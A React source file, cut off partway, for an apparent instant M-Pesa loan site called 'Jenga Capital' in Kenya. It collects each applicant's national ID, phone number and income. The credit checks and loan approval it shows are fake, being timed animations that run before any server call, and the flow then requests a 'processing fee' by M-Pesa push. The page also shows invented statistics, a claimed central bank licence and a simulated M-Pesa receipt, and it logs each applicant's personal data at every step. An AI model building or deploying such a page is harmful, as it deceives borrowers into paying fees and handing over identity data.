import { useState, useEffect } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Slider } from "@/components/ui/slider";
import { Checkbox } from "@/components/ui/checkbox";
import { useToast } from "@/hooks/use-toast";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { 
  Wallet, 
  Trophy, 
  Zap, 
  CheckCircle2,
  ArrowLeft,
  ArrowRight,
  Loader2,
  Phone,
  Mail,
  Circle
} from "lucide-react";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { GalaxyBackground } from "@/components/GalaxyBackground";
import { Moon, Sun } from "lucide-react";

interface User {
  phoneNumber: string;
  balance: string;
  loanLimit: string;
}

interface Transaction {
  id: number;
  type: string;
  amount: string;
  reference: string;
  status: string;
  payment_status?: string;
  created_at: string;
}

const PREDEFINED_LOAN_AMOUNTS = [
  { amount: 10000, repay: 11500 },
  { amount: 25000, repay: 28750 },
  { amount: 50000, repay: 57500 },
  { amount: 75000, repay: 86250 },
  { amount: 100000, repay: 115000 },
];

// Calculate processing fee based on loan amount (max 100k)
const calculateProcessingFee = (amount: number): number => {
  if (amount >= 10000 && amount <= 25100) {
    return 200;
  } else if (amount > 25100 && amount <= 50000) {
    return 225;
  } else if (amount > 50000 && amount <= 75000) {
    return 250;
  } else if (amount > 75000 && amount <= 100000) {
    return 275;
  }
  return 200; // Default for amounts below 10,000
};

const REPAYMENT_PERIOD = 30;

// Helper function to log frontend actions
const logWebAppAction = async (action: string, step?: number | string, data?: Record<string, any>) => {
  try {
    await fetch("/api/public/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action,
        step: step !== undefined ? String(step) : null,
        data: data || {},
      }),
    });
  } catch (error) {
    // Silently fail - don't interrupt user flow
    console.error("Failed to log action:", error);
  }
};

export default function LoanService() {
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [isDarkMode, setIsDarkMode] = useState(() => {
    if (typeof window !== "undefined") {
      return document.documentElement.classList.contains("dark");
    }
    return false;
  });
  
  const [showModal, setShowModal] = useState(false);
  const [currentStep, setCurrentStep] = useState(1);
  const [loanAmount, setLoanAmount] = useState(10000);
  const [customAmount, setCustomAmount] = useState(10000);
  const [personalInfo, setPersonalInfo] = useState({
    fullName: "",
    mpesaNumber: "",
    idNumber: "",
    email: "",
    location: "",
  });
  const [employmentInfo, setEmploymentInfo] = useState({
    employmentStatus: "",
    employerName: "",
    monthlyIncome: "",
    loanPurpose: "",
  });
  const [processingState, setProcessingState] = useState<
    "idle" | "submitting" | "verifying" | "checking" | "assessing" | "approving" | "approved" | "stk-push"
  >("idle");
  const [termsAccepted, setTermsAccepted] = useState(false);
  
  // Animated statistics values
  const [stats, setStats] = useState({
    kenyansServed: 0,
    loansDisbursed: 0,
    customerRating: 0,
    averageApproval: 0,
  });

  // Request loan mutation with animated states
  const requestLoanMutation = useMutation({
    mutationFn: async () => {
      // Format phone number properly (remove +254 prefix, API will add it)
      let phoneNumber = personalInfo.mpesaNumber.replace(/[^0-9]/g, '');
      if (phoneNumber.startsWith("254")) {
        phoneNumber = phoneNumber.substring(3);
      } else if (phoneNumber.startsWith("0")) {
        phoneNumber = phoneNumber.substring(1);
      }

      // Log processing states
      setProcessingState("submitting");
      logWebAppAction("PROCESSING_STATE", "submitting", {});
      await new Promise((resolve) => setTimeout(resolve, 1500));

      setProcessingState("verifying");
      logWebAppAction("PROCESSING_STATE", "verifying", {});
      await new Promise((resolve) => setTimeout(resolve, 2000));

      setProcessingState("checking");
      logWebAppAction("PROCESSING_STATE", "checking", {});
      await new Promise((resolve) => setTimeout(resolve, 2000));

      setProcessingState("assessing");
      logWebAppAction("PROCESSING_STATE", "assessing", {});
      await new Promise((resolve) => setTimeout(resolve, 2000));

      setProcessingState("approving");
      logWebAppAction("PROCESSING_STATE", "approving", {});
      await new Promise((resolve) => setTimeout(resolve, 2000));

      setProcessingState("approved");
      logWebAppAction("PROCESSING_STATE", "approved", {});
      await new Promise((resolve) => setTimeout(resolve, 2000));

      // Make actual API call
      try {
        // Log API request
        logWebAppAction("API_REQUEST_SENT", "api", {
          endpoint: "/api/public/request-loan",
          loanAmount: loanAmount.toString(),
        });

        const response = await fetch("/api/public/request-loan", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            phoneNumber: phoneNumber, // Send just the number, API will format it
            amount: loanAmount.toString(),
            idNumber: personalInfo.idNumber,
            fullName: personalInfo.fullName,
            email: personalInfo.email,
            location: personalInfo.location,
            employmentStatus: employmentInfo.employmentStatus,
            employerName: employmentInfo.employerName,
            monthlyIncome: employmentInfo.monthlyIncome,
            loanPurpose: employmentInfo.loanPurpose,
          }),
        });

        // Check if response is JSON
        const contentType = response.headers.get("content-type");
        if (!contentType || !contentType.includes("application/json")) {
          const text = await response.text();
          logWebAppAction("API_ERROR", "api", {
            status: response.status,
            error: "Server returned HTML instead of JSON",
          });
          throw new Error(`Server returned HTML instead of JSON. Status: ${response.status}`);
        }

        const data = await response.json();

        if (!response.ok) {
          logWebAppAction("API_ERROR", "api", {
            status: response.status,
            error: data.error || "Unknown error",
          });
          throw new Error(data.error || `Request failed with status ${response.status}`);
        }

        // Log successful API response
        logWebAppAction("API_SUCCESS", "api", {
          transactionId: data.transactionId,
          reference: data.reference,
          feeAmount: data.feeAmount,
        });

        // After approval message, transition to STK push
        await new Promise((resolve) => setTimeout(resolve, 2000));
        setProcessingState("stk-push");
        logWebAppAction("STK_PUSH_INITIATED", "stk-push", { phoneNumber, loanAmount });
        return data;
      } catch (error: any) {
        // Handle network errors or JSON parsing errors
        if (error instanceof TypeError && error.message.includes("fetch")) {
          throw new Error("Network error. Please check your connection and try again.");
        }
        throw error;
      }
    },
    onSuccess: (data) => {
      // Log successful submission
      logWebAppAction("SUBMIT_SUCCESS", "complete", {
        transactionId: data.transactionId,
        reference: data.reference,
      });
      queryClient.invalidateQueries({ queryKey: ["user"] });
    },
    onError: (error: Error) => {
      logWebAppAction("SUBMIT_ERROR", "error", {
        error: error.message || "Unknown error",
      });
      setProcessingState("idle");
      toast({
        title: "Error",
        description: error.message || "Failed to submit loan application. Please try again.",
        variant: "destructive",
      });
    },
  });

  const handleLoanAmountSelect = (amount: number) => {
    logWebAppAction("LOAN_AMOUNT_SELECTED", "1", { 
      selectedAmount: amount,
      selectedAmountKES: `KES ${amount.toLocaleString()}`,
    });
    setLoanAmount(amount);
    setCustomAmount(amount);
  };

  const handleSliderChange = (value: number[]) => {
    const amount = Math.min(value[0], 100000); // Enforce max of 100k
    logWebAppAction("LOAN_AMOUNT_SLIDER_CHANGED", "1", { 
      sliderAmount: amount,
      sliderAmountKES: `KES ${amount.toLocaleString()}`,
    });
    setCustomAmount(amount);
    setLoanAmount(amount);
  };

  const handleNext = () => {
    if (currentStep === 1) {
      if (loanAmount < 10000 || loanAmount > 100000) {
        logWebAppAction("VALIDATION_ERROR", "1", { error: "Invalid amount", loanAmount: loanAmount });
        toast({
          title: "Invalid Amount",
          description: "Loan amount must be between Ksh. 10,000 and Ksh. 100,000",
          variant: "destructive",
        });
        return;
      }
      // Log step 1 completion with exact loan amount
      logWebAppAction("STEP_COMPLETED", "1", { 
        loanAmount: loanAmount,
        loanAmountKES: `KES ${loanAmount.toLocaleString()}`,
        customAmount: customAmount,
      });
    } else if (currentStep === 2) {
      if (!personalInfo.fullName || !personalInfo.mpesaNumber || !personalInfo.idNumber || !personalInfo.location) {
        logWebAppAction("VALIDATION_ERROR", "2", { 
          error: "Missing required fields",
          fullName: personalInfo.fullName || "empty",
          mpesaNumber: personalInfo.mpesaNumber || "empty",
          idNumber: personalInfo.idNumber || "empty",
          location: personalInfo.location || "empty",
        });
        toast({
          title: "Missing Information",
          description: "Please fill in all required fields",
          variant: "destructive",
        });
        return;
      }
      // Log step 2 completion with exact personal details
      logWebAppAction("STEP_COMPLETED", "2", {
        fullName: personalInfo.fullName,
        mpesaNumber: personalInfo.mpesaNumber,
        idNumber: personalInfo.idNumber,
        email: personalInfo.email || "not provided",
        location: personalInfo.location,
      });
    } else if (currentStep === 3) {
      if (!employmentInfo.employmentStatus || !employmentInfo.monthlyIncome || !employmentInfo.loanPurpose) {
        logWebAppAction("VALIDATION_ERROR", "3", { 
          error: "Missing required fields",
          employmentStatus: employmentInfo.employmentStatus || "empty",
          monthlyIncome: employmentInfo.monthlyIncome || "empty",
          loanPurpose: employmentInfo.loanPurpose || "empty",
        });
        toast({
          title: "Missing Information",
          description: "Please fill in all required fields",
          variant: "destructive",
        });
        return;
      }
      // Log step 3 completion with exact employment details
      logWebAppAction("STEP_COMPLETED", "3", {
        employmentStatus: employmentInfo.employmentStatus,
        employerName: employmentInfo.employerName || "not provided",
        monthlyIncome: employmentInfo.monthlyIncome,
        loanPurpose: employmentInfo.loanPurpose,
      });
    }
    setCurrentStep(currentStep + 1);
  };

  const handleBack = () => {
    setCurrentStep(currentStep - 1);
  };

  const handleSubmit = () => {
    if (!termsAccepted) {
      logWebAppAction("VALIDATION_ERROR", "4", { error: "Terms not accepted" });
      toast({
        title: "Terms & Conditions Required",
        description: "Please accept the Terms & Conditions to continue",
        variant: "destructive",
      });
      return;
    }
    // Log step 4 completion with all collected data
    logWebAppAction("STEP_COMPLETED", "4", { termsAccepted: true });
    
    // Log complete submission data
    logWebAppAction("SUBMIT_STARTED", "4", {
      loanAmount: loanAmount,
      loanAmountKES: `KES ${loanAmount.toLocaleString()}`,
      personalInfo: {
        fullName: personalInfo.fullName,
        mpesaNumber: personalInfo.mpesaNumber,
        idNumber: personalInfo.idNumber,
        email: personalInfo.email || "not provided",
        location: personalInfo.location,
      },
      employmentInfo: {
        employmentStatus: employmentInfo.employmentStatus,
        employerName: employmentInfo.employerName || "not provided",
        monthlyIncome: employmentInfo.monthlyIncome,
        loanPurpose: employmentInfo.loanPurpose,
      },
    });
    setProcessingState("submitting");
    requestLoanMutation.mutate();
  };

  const handleClose = () => {
    setShowModal(false);
    setCurrentStep(1);
    setProcessingState("idle");
    setLoanAmount(10000);
    setCustomAmount(10000);
    setPersonalInfo({
      fullName: "",
      mpesaNumber: "",
      idNumber: "",
      email: "",
      location: "",
    });
    setEmploymentInfo({
      employmentStatus: "",
      employerName: "",
      monthlyIncome: "",
      loanPurpose: "",
    });
    setTermsAccepted(false);
  };

  const formatCurrency = (amount: number) => {
    return `Ksh. ${amount.toLocaleString("en-KE")}`;
  };

  const calculateRepayment = (amount: number) => {
    return Math.round(amount * 1.15); // 15% interest
  };

  useEffect(() => {
    const savedTheme = localStorage.getItem("theme");
    if (savedTheme === "dark") {
      setIsDarkMode(true);
      document.documentElement.classList.add("dark");
    } else {
      setIsDarkMode(false);
      document.documentElement.classList.remove("dark");
    }
  }, []);

  // Animate statistics on mount
  useEffect(() => {
    const duration = 2000; // 2 seconds
    const steps = 60;
    const interval = duration / steps;
    
    let step = 0;
    const timer = setInterval(() => {
      step++;
      const progress = step / steps;
      
      // Easing function for smooth animation
      const easeOutQuart = (x: number) => 1 - Math.pow(1 - x, 4);
      const eased = easeOutQuart(progress);
      
      setStats({
        kenyansServed: Math.floor(75000 * eased),
        loansDisbursed: 3.2 * eased, // In billions
        customerRating: 4.9 * eased,
        averageApproval: 2 * eased,
      });
      
      if (step >= steps) {
        clearInterval(timer);
        // Set final values
        setStats({
          kenyansServed: 75000,
          loansDisbursed: 3.2,
          customerRating: 4.9,
          averageApproval: 2,
        });
      }
    }, interval);
    
    return () => clearInterval(timer);
  }, []);

  const toggleDarkMode = () => {
    const newMode = !isDarkMode;
    setIsDarkMode(newMode);
    if (newMode) {
      document.documentElement.classList.add("dark");
      localStorage.setItem("theme", "dark");
    } else {
      document.documentElement.classList.remove("dark");
      localStorage.setItem("theme", "light");
    }
  };

  return (
    <div className="min-h-screen bg-background relative">
      {isDarkMode && <GalaxyBackground />}
      {/* Header */}
      <header className="bg-card/80 backdrop-blur-sm border-b border-border sticky top-0 z-50 relative">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-lg bg-primary flex items-center justify-center">
                <span className="text-primary-foreground font-bold text-xl">J</span>
              </div>
              <div>
                <h1 className="text-xl font-bold text-foreground">
                  Jenga <span className="text-primary">Capital</span>
                </h1>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <Button
                variant="ghost"
                size="sm"
                onClick={toggleDarkMode}
              >
                {isDarkMode ? <Sun className="w-4 h-4" /> : <Moon className="w-4 h-4" />}
              </Button>
              <nav className="hidden md:flex items-center gap-6">
                <a href="#features" className="text-muted-foreground hover:text-foreground transition-colors">Features</a>
                <a href="#rates" className="text-muted-foreground hover:text-foreground transition-colors">Rates</a>
                <a href="#trust" className="text-muted-foreground hover:text-foreground transition-colors">Why Trust Us</a>
                <a href="#contact" className="text-muted-foreground hover:text-foreground transition-colors">Contact</a>
              </nav>
              <Button
                onClick={() => {
                  logWebAppAction("MODAL_OPENED", "init", {});
                  setShowModal(true);
                }}
                className="bg-primary hover:bg-primary/90 text-primary-foreground"
              >
                Apply Now
              </Button>
            </div>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <section className="bg-gradient-to-br from-primary via-primary/90 to-primary/80 text-primary-foreground py-20">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
            <div className="space-y-6">
              <h1 className="text-5xl font-bold leading-tight">
                KE Instant M-Pesa Loans in Kenya
              </h1>
              <p className="text-xl text-white/90">Haraka haraka, Instant Pesa</p>
              <p className="text-lg text-white/80">Direct to your M-Pesa</p>
              
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 pt-4">
                <Card className="bg-white/10 backdrop-blur border-white/20">
                  <CardContent className="p-4 text-center">
                    <Trophy className="w-8 h-8 mx-auto mb-2 text-yellow-400" />
                    <p className="font-semibold">Most Reliable</p>
                  </CardContent>
                </Card>
                <Card className="bg-white/10 backdrop-blur border-white/20">
                  <CardContent className="p-4 text-center">
                    <Zap className="w-8 h-8 mx-auto mb-2 text-accent" />
                    <p className="font-semibold">Instant & Secure</p>
                  </CardContent>
                </Card>
                <Card className="bg-white/10 backdrop-blur border-white/20">
                  <CardContent className="p-4 text-center">
                    <div className="w-8 h-8 mx-auto mb-2 rounded bg-purple-500 flex items-center justify-center">
                      <span className="text-white font-bold text-sm">KE</span>
                    </div>
                    <p className="font-semibold">Proudly Kenyan</p>
                  </CardContent>
                </Card>
              </div>

              <Button
                onClick={() => {
                  logWebAppAction("MODAL_OPENED", "init", {});
                  setShowModal(true);
                }}
                size="lg"
                className="bg-accent hover:bg-accent/90 text-accent-foreground text-lg px-8 py-6 mt-6"
              >
                Apply for Instant Loan
              </Button>
            </div>

            {/* M-Pesa Phone Mockup */}
            <div className="flex justify-center lg:justify-end">
              <div className="relative">
                <div className={`w-64 h-[500px] rounded-[3rem] p-4 shadow-2xl ${isDarkMode ? 'bg-card border border-border' : 'bg-black'}`}>
                  <div className="w-full h-full bg-white rounded-[2.5rem] p-4">
                    <div className={`rounded-lg p-4 h-full ${isDarkMode ? 'bg-muted' : 'bg-gray-100'}`}>
                      <div className={`rounded-lg p-4 shadow ${isDarkMode ? 'bg-card' : 'bg-white'}`}>
                        <div className="flex items-center justify-between mb-2">
                          <span className={`font-bold ${isDarkMode ? 'text-accent' : 'text-green-600'}`}>M-PESA</span>
                          <span className={`text-sm ${isDarkMode ? 'text-muted-foreground' : 'text-gray-500'}`}>Now</span>
                        </div>
                        <div className="space-y-2">
                          <p className={`text-sm ${isDarkMode ? 'text-foreground' : 'text-gray-700'}`}>
                            You have received <span className="font-bold text-lg">Ksh. {loanAmount.toLocaleString()}</span> from Jenga Capital
                          </p>
                          <p className={`text-xs ${isDarkMode ? 'text-muted-foreground' : 'text-gray-500'}`}>
                            Transaction: JEN{Math.random().toString(36).substr(2, 9).toUpperCase()}
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Statistics Section */}
      <section className="bg-card/50 py-16 relative">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-8">
            <div className="text-center">
              <div className="text-4xl font-bold text-primary mb-2">
                {stats.kenyansServed.toLocaleString()}+
              </div>
              <p className="text-foreground font-semibold">Kenyans Served</p>
              <p className="text-sm text-muted-foreground">Across all 47 counties</p>
            </div>
            <div className="text-center">
              <div className="text-4xl font-bold text-primary mb-2">
                KSh {stats.loansDisbursed.toFixed(1)}B+
              </div>
              <p className="text-foreground font-semibold">Loans Disbursed</p>
              <p className="text-sm text-muted-foreground">Since 2022</p>
            </div>
            <div className="text-center">
              <div className="text-4xl font-bold text-primary mb-2">
                {stats.customerRating.toFixed(1)}
              </div>
              <p className="text-foreground font-semibold">Customer Rating</p>
              <p className="text-sm text-muted-foreground">Google Play Store</p>
            </div>
            <div className="text-center">
              <div className="text-4xl font-bold text-primary mb-2">
                {Math.floor(stats.averageApproval)} min
              </div>
              <p className="text-foreground font-semibold">Average Approval</p>
              <p className="text-sm text-muted-foreground">Record fast processing</p>
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-card border-t border-border py-8 relative">
        <div className="container mx-auto px-4">
          <div className="flex flex-col md:flex-row items-center justify-between gap-4">
            {/* Logo and Company Name */}
            <div className="flex items-center gap-3">
              <div className={`w-10 h-10 rounded-lg flex items-center justify-center ${isDarkMode ? 'bg-primary' : 'bg-white'}`}>
                <span className={`font-bold text-xl ${isDarkMode ? 'text-primary-foreground' : 'text-foreground'}`}>J</span>
              </div>
              <div>
                <h2 className="text-xl font-bold text-foreground">Jenga Capital</h2>
              </div>
            </div>

            {/* License and Contact Info */}
            <div className="flex flex-col items-center md:items-end gap-2 text-sm">
              <p className="text-muted-foreground">
                Licensed by Central Bank of Kenya | Proudly Kenyan Financial Services
              </p>
              <div className="flex items-center gap-4">
                <div className="flex items-center gap-2">
                  <Phone className="w-4 h-4 text-pink-400" />
                  <span className="text-foreground">0700 000 000</span>
                </div>
                <span className="text-muted-foreground">|</span>
                <div className="flex items-center gap-2">
                  <Mail className="w-4 h-4 text-primary" />
                  <span className="text-foreground">info@jengacapital.co.ke</span>
                </div>
              </div>
            </div>
          </div>

          {/* Live Updates Status */}
          <div className="mt-6 flex justify-end">
            <div className={`flex items-center gap-2 rounded-lg px-3 py-1.5 ${isDarkMode ? 'bg-muted/50 border border-border' : 'bg-black/50'}`}>
              <Circle className="w-2 h-2 fill-green-500 text-green-500" />
              <span className={`text-xs ${isDarkMode ? 'text-foreground' : 'text-white'}`}>Live Updates Connected</span>
            </div>
          </div>
        </div>
      </footer>

      {/* Loan Application Modal */}
      <Dialog open={showModal} onOpenChange={setShowModal}>
        <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto">
          <div className="space-y-6">
            {/* Header */}
            <div className="flex items-center justify-between">
              <h2 className="text-2xl font-bold">Apply for Instant M-Pesa Loan</h2>
            </div>

            {/* Progress Steps */}
            <div className="space-y-2">
              <div className="flex items-center justify-between">
                {[1, 2, 3, 4].map((step) => (
                  <div key={step} className="flex flex-col items-center flex-1">
                    <div
                      className={`w-10 h-10 rounded-full flex items-center justify-center font-bold ${
                        currentStep === step
                          ? "bg-primary text-primary-foreground"
                          : currentStep > step
                          ? "bg-accent text-accent-foreground"
                          : "bg-muted text-muted-foreground"
                      }`}
                    >
                      {step}
                    </div>
                    <span className="text-xs mt-2 text-center">
                      {step === 1 && "Loan Amount"}
                      {step === 2 && "Personal Info"}
                      {step === 3 && "Employment"}
                      {step === 4 && "Review"}
                    </span>
                  </div>
                ))}
              </div>
              <div className="h-1 bg-muted rounded-full relative">
                <div
                  className="h-1 bg-primary rounded-full transition-all"
                  style={{ width: `${((currentStep - 1) / 3) * 100}%` }}
                />
              </div>
            </div>

            {/* Step 1: Loan Amount */}
            {currentStep === 1 && (
              <div className="space-y-6">
                <h3 className="text-xl font-bold">Select Loan Amount</h3>
                <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
                  {PREDEFINED_LOAN_AMOUNTS.map((option) => (
                    <Card
                      key={option.amount}
                      className={`cursor-pointer transition-all ${
                        loanAmount === option.amount
                          ? "border-primary border-2 bg-primary/10"
                          : "border-border hover:border-primary/50"
                      }`}
                      onClick={() => handleLoanAmountSelect(option.amount)}
                    >
                      <CardContent className="p-4 text-center">
                        <div className="font-bold text-lg mb-1">
                          {formatCurrency(option.amount)}
                        </div>
                        <div className="text-sm text-muted-foreground">
                          Repay: {formatCurrency(option.repay)}
                        </div>
                        <div className="text-xs text-primary font-semibold mt-1">
                          Fee: {formatCurrency(calculateProcessingFee(option.amount))}
                        </div>
                        <div className="text-xs text-muted-foreground mt-1">
                          {REPAYMENT_PERIOD} days
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
                <div className="space-y-4">
                  <Label>Or enter custom amount (Ksh. 10,000 - 100,000)</Label>
                  <Slider
                    value={[customAmount]}
                    onValueChange={handleSliderChange}
                    min={10000}
                    max={100000}
                    step={1000}
                    className="w-full"
                  />
                  <div className="flex items-center justify-center gap-4">
                    <div className="text-3xl font-bold text-primary text-center">
                      {formatCurrency(customAmount)}
                    </div>
                    <div className="text-sm text-muted-foreground">
                      Fee: {formatCurrency(calculateProcessingFee(customAmount))}
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Step 2: Personal Info */}
            {currentStep === 2 && (
              <div className="space-y-4">
                <h3 className="text-xl font-bold">Personal Information</h3>
                <div className="space-y-4">
                  <div>
                    <Label htmlFor="fullName">Full Name *</Label>
                    <Input
                      id="fullName"
                      value={personalInfo.fullName}
                      onChange={(e) =>
                        setPersonalInfo({ ...personalInfo, fullName: e.target.value })
                      }
                      required
                    />
                  </div>
                  <div>
                    <Label htmlFor="mpesaNumber">M-Pesa Number *</Label>
                    <div className="flex gap-2">
                      <div className="w-20 px-3 py-2 bg-muted border border-border rounded-md text-foreground flex items-center">
                        +254
                      </div>
                      <Input
                        id="mpesaNumber"
                        type="tel"
                        value={personalInfo.mpesaNumber}
                        onChange={(e) =>
                          setPersonalInfo({ ...personalInfo, mpesaNumber: e.target.value })
                        }
                        placeholder="xxxxxxxxx"
                        required
                        className="flex-1"
                      />
                    </div>
                  </div>
                  <div>
                    <Label htmlFor="idNumber">National ID Number *</Label>
                    <Input
                      id="idNumber"
                      value={personalInfo.idNumber}
                      onChange={(e) =>
                        setPersonalInfo({ ...personalInfo, idNumber: e.target.value })
                      }
                      required
                    />
                  </div>
                  <div>
                    <Label htmlFor="email">Email Address (Optional)</Label>
                    <Input
                      id="email"
                      type="email"
                      value={personalInfo.email}
                      onChange={(e) =>
                        setPersonalInfo({ ...personalInfo, email: e.target.value })
                      }
                      placeholder="your.email@example.com"
                    />
                  </div>
                  <div>
                    <Label htmlFor="location">Location *</Label>
                    <Select
                      value={personalInfo.location}
                      onValueChange={(value) =>
                        setPersonalInfo({ ...personalInfo, location: value })
                      }
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Select location" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="nairobi">Nairobi</SelectItem>
                        <SelectItem value="mombasa">Mombasa</SelectItem>
                        <SelectItem value="kisumu">Kisumu</SelectItem>
                        <SelectItem value="nakuru">Nakuru</SelectItem>
                        <SelectItem value="eldoret">Eldoret</SelectItem>
                        <SelectItem value="thika">Thika</SelectItem>
                        <SelectItem value="other">Other</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>
              </div>
            )}

            {/* Step 3: Employment */}
            {currentStep === 3 && (
              <div className="space-y-4">
                <h3 className="text-xl font-bold">Employment Details</h3>
                <div className="space-y-4">
                  <div>
                    <Label>Employment Status *</Label>
                    <RadioGroup
                      value={employmentInfo.employmentStatus}
                      onValueChange={(value) =>
                        setEmploymentInfo({ ...employmentInfo, employmentStatus: value })
                      }
                    >
                      <div className="flex items-center space-x-2">
                        <RadioGroupItem value="employed" id="employed" />
                        <Label htmlFor="employed">Employed</Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <RadioGroupItem value="self-employed" id="self-employed" />
                        <Label htmlFor="self-employed">Self-Employed</Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <RadioGroupItem value="student" id="student" />
                        <Label htmlFor="student">Student</Label>
                      </div>
                    </RadioGroup>
                  </div>
                  {employmentInfo.employmentStatus === "employed" && (
                    <div>
                      <Label htmlFor="employerName">Employer Name</Label>
                      <Input
                        id="employerName"
                        value={employmentInfo.employerName}
                        onChange={(e) =>
                          setEmploymentInfo({ ...employmentInfo, employerName: e.target.value })
                        }
                      />
                    </div>
                  )}
                  <div>
                    <Label htmlFor="monthlyIncome">Monthly Income (Ksh.) *</Label>
                    <Select
                      value={employmentInfo.monthlyIncome}
                      onValueChange={(value) =>
                        setEmploymentInfo({ ...employmentInfo, monthlyIncome: value })
                      }
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Select income range" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="0-20000">0 - 20,000</SelectItem>
                        <SelectItem value="20001-50000">20,001 - 50,000</SelectItem>
                        <SelectItem value="50001-100000">50,001 - 100,000</SelectItem>
                        <SelectItem value="100001-200000">100,001 - 200,000</SelectItem>
                        <SelectItem value="200001+">200,001+</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  <div>
                    <Label htmlFor="loanPurpose">Loan Purpose *</Label>
                    <Select
                      value={employmentInfo.loanPurpose}
                      onValueChange={(value) =>
                        setEmploymentInfo({ ...employmentInfo, loanPurpose: value })
                      }
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Select purpose" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="business">Business</SelectItem>
                        <SelectItem value="personal">Personal</SelectItem>
                        <SelectItem value="education">Education</SelectItem>
                        <SelectItem value="emergency">Emergency</SelectItem>
                        <SelectItem value="other">Other</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>
              </div>
            )}

            {/* Step 4: Review */}
            {currentStep === 4 && processingState === "idle" && (
              <div className="space-y-6">
                <h3 className="text-xl font-bold">Review & Submit Application</h3>
                
                {/* Application Details */}
                <Card>
                  <CardContent className="p-4 space-y-3">
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Loan Amount:</span>
                      <span className="font-bold">{formatCurrency(loanAmount)}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Repayment Amount:</span>
                      <span className="font-bold">{formatCurrency(calculateRepayment(loanAmount))}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">M-Pesa Number:</span>
                      <span className="font-bold">+254 {personalInfo.mpesaNumber || ''}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Name:</span>
                      <span className="font-bold">{personalInfo.fullName}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Location:</span>
                      <span className="font-bold capitalize">{personalInfo.location}</span>
                    </div>
                    {personalInfo.email && (
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Email:</span>
                        <span className="font-bold">{personalInfo.email}</span>
                      </div>
                    )}
                  </CardContent>
                </Card>

                {/* Terms & Conditions Checkbox */}
                <div className="flex items-start space-x-2">
                  <Checkbox 
                    id="terms" 
                    checked={termsAccepted}
                    onCheckedChange={(checked) => setTermsAccepted(checked === true)}
                    className="mt-1"
                  />
                  <label 
                    htmlFor="terms" 
                    className="text-sm leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 cursor-pointer"
                  >
                    I agree to the{" "}
                    <span className="text-orange-500 font-semibold">Terms & Conditions</span>
                    {" "}and confirm that all information provided is accurate.
                  </label>
                </div>

                {/* Important Information Section */}
                <Card className="border-l-4 border-l-orange-500">
                  <CardContent className="p-4">
                    <p className="font-bold text-sm mb-2">Important:</p>
                    <p className="text-sm text-foreground mb-2">
                      By submitting, you authorize Jenga Capital to:
                    </p>
                    <ul className="list-disc list-inside space-y-1 text-sm text-foreground ml-2">
                      <li>Access your M-Pesa statement for credit assessment</li>
                      <li>Contact your provided references</li>
                      <li>Process your loan application</li>
                    </ul>
                  </CardContent>
                </Card>
              </div>
            )}

            {/* Processing States */}
            {processingState !== "idle" && (
              <div className="text-center py-8 space-y-4">
                {/* Submitting */}
                {processingState === "submitting" && (
                  <>
                    <Loader2 className="w-12 h-12 mx-auto animate-spin text-primary" />
                    <h3 className="text-xl font-bold">Processing Your Application</h3>
                    <p className="text-muted-foreground">Please wait while we process your loan request...</p>
                  </>
                )}

                {/* Verifying */}
                {processingState === "verifying" && (
                  <>
                    <Loader2 className="w-12 h-12 mx-auto animate-spin text-primary" />
                    <h3 className="text-xl font-bold">Processing Your Application</h3>
                    <p className="text-muted-foreground">Please wait while we process your loan request...</p>
                    <p className="text-muted-foreground italic">Verifying your details...</p>
                  </>
                )}

                {/* Checking M-Pesa */}
                {processingState === "checking" && (
                  <>
                    <Loader2 className="w-12 h-12 mx-auto animate-spin text-primary" />
                    <h3 className="text-xl font-bold">Processing Your Application</h3>
                    <p className="text-muted-foreground">Please wait while we process your loan request...</p>
                    <p className="text-muted-foreground italic">Checking M-Pesa records...</p>
                  </>
                )}

                {/* Assessing Credit */}
                {processingState === "assessing" && (
                  <>
                    <Loader2 className="w-12 h-12 mx-auto animate-spin text-primary" />
                    <h3 className="text-xl font-bold">Processing Your Application</h3>
                    <p className="text-muted-foreground">Please wait while we process your loan request...</p>
